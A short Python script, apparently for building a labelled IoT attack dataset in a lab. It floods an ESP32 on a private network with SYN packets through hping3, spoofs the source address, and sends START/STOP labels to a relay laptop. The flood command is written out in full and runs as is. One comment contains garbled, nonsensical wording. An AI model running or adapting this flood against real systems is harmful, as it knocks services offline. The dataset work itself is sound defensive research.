import os
import socket
import time

# Configuration
PC_IP = '192.168.0.13'  # IP of the device that receives labels (relay laptop)
PC_PORT = 9999

TARGET_IP = '192.168.0.15'  # IP of the ESP32 target
TARGET_PORT = 80               # Target service port on the ESP32 (e.g. HTTP server)

KALI_OUT_INTERFACE = 'eth1' 
KALI_SRC_IP = '192.168.0.16'

LABEL_REPEATS = 1
LABEL_PAUSE = 0.2

def send_label(status, repeats=LABEL_REPEATS, pause=LABEL_PAUSE):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for _ in range(repeats):
        # Send JSON-formatted labels to simplify later dataset parsing
        message = f'{{"status": "{status}", "attack_type": "SYN_FLOOD", "timestamp": {time.time()}}}'
        sock.sendto(message.encode(), (PC_IP, PC_PORT))
        time.sleep(pause)

print(">>> READY FOR SYN FLOOD ATTACK, NOTIFY THE LABELERS")
send_label("START")
time.sleep(1)

# Attack parameters
# hping3 flags used below:
# -S: send SYN packets
# -p: target port
# -c: number of packets per batch
# --flood: send as fast as possible without waiting for replies
# --rand-source: (optional) spoof random source IPs to increase difficulty for detection
batch_count = 5000
repeats = 10
pause_between_batches = 2.0  # Pause between batches to allow ESP32 time to record syslog/resource state

for i in range(repeats):
    print(f">>> Batch {i+1}/{repeats}: flooding {batch_count} SYN packets")
    # Execute hping3 command
    # Note: hping3 typically requires sudo privileges
    # -I Forces the network to use the eth1 tunnel
    # -a Forces the network to claim that it is the real internal network 192.168.0.16, directly breaking through the NAT's parallel spacetime protection shield!
    cmd = f"sudo timeout 10 hping3 -S -p {TARGET_PORT} -c {batch_count} --flood -I {KALI_OUT_INTERFACE} -a {KALI_SRC_IP} {TARGET_IP} > /dev/null 2>&1"
    os.system(cmd)
    
    # Important: pause after each batch so the ESP32 has a chance to report resource exhaustion in its syslog
    time.sleep(pause_between_batches)

time.sleep(1)
send_label("STOP")
print(" >>> ATTACK IS FINISHED")